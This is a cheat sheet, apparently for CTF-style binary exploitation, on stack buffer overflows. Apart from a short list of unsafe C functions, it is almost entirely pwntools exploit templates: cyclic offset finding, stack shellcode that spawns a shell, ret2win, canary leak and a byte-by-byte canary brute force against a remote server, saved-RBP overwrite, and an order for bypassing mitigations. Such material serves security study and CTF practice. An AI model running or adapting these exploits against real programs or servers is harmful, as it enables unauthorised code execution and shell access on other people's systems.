# Stack-Based Buffer Overflow

## Detection Patterns
```c
// Vulnerable functions to look for in disassembly/decompilation
gets(buf)              // No bounds checking at all
strcpy(dst, src)        // No bounds checking
sprintf(buf, fmt, ...)  // No bounds checking
scanf("%s", buf)        // No bounds checking
strcat(dst, src)        // No bounds checking
read(fd, buf, large_n)  // Read more than buffer size
```

## Finding Offset to Return Address
```python
from pwn import *

# Method 1: cyclic pattern
payload = cyclic(200)
p = process('./binary')
p.sendline(payload)
p.wait()
core = p.corefile
offset = cyclic_find(core.read(core.esp, 4))  # or core.rsp for x64
print(f"Offset: {offset}")

# Method 2: GDB pwndbg
# (gdb) cyclic 200
# (gdb) run then send pattern
# (gdb) cyclic -l 0x6161616c   # after crash, find offset from $rsp value
```

## Basic Exploit Structure (No Protections)
```python
from pwn import *

context.arch = 'amd64'
p = process('./binary')

offset = 72  # determined via cyclic
shellcode = asm(shellcraft.sh())

payload = shellcode.ljust(offset, b'A')
payload += p64(buf_addr)  # address where shellcode lands (stack address)

p.sendline(payload)
p.interactive()
```

## ret2win (Call Existing Win Function)
```python
from pwn import *

elf = ELF('./binary')
p = process('./binary')

offset = 72
win_addr = elf.symbols['win']

payload = b'A' * offset + p64(win_addr)
p.sendline(payload)
p.interactive()
```

## Stack Canary Bypass

### Leak Canary via Format String or Partial Overwrite
```python
# If canary can be leaked (e.g., via printf %p or info leak)
# Canary is typically null byte + 7 random bytes: \x00XXXXXXX
payload = b'A' * offset_to_canary
payload += canary_value  # leaked value
payload += b'B' * 8  # saved rbp
payload += p64(target_addr)
```

### Brute Force Canary (if forking server, byte-by-byte)
```python
canary = b'\x00'
for i in range(7):
    for byte in range(256):
        test_canary = canary + bytes([byte])
        payload = b'A' * offset + test_canary
        p = remote('target.com', 1337)
        p.sendline(payload)
        if b"crash_indicator" not in p.recv():
            canary += bytes([byte])
            break
        p.close()
```

## Overwriting Saved RBP for Additional Control
```python
payload = b'A' * offset_to_rbp
payload += p64(fake_rbp)      # controls next frame's rbp
payload += p64(target_addr)   # return address
```

## Common Mitigations Bypass Order
```
1. No canary, No NX      → shellcode on stack directly
2. No canary, NX enabled → ret2libc or ROP chain
3. Canary present         → leak canary first (format string, info leak) then proceed
4. PIE enabled            → leak an address first (any function pointer) to compute base
```
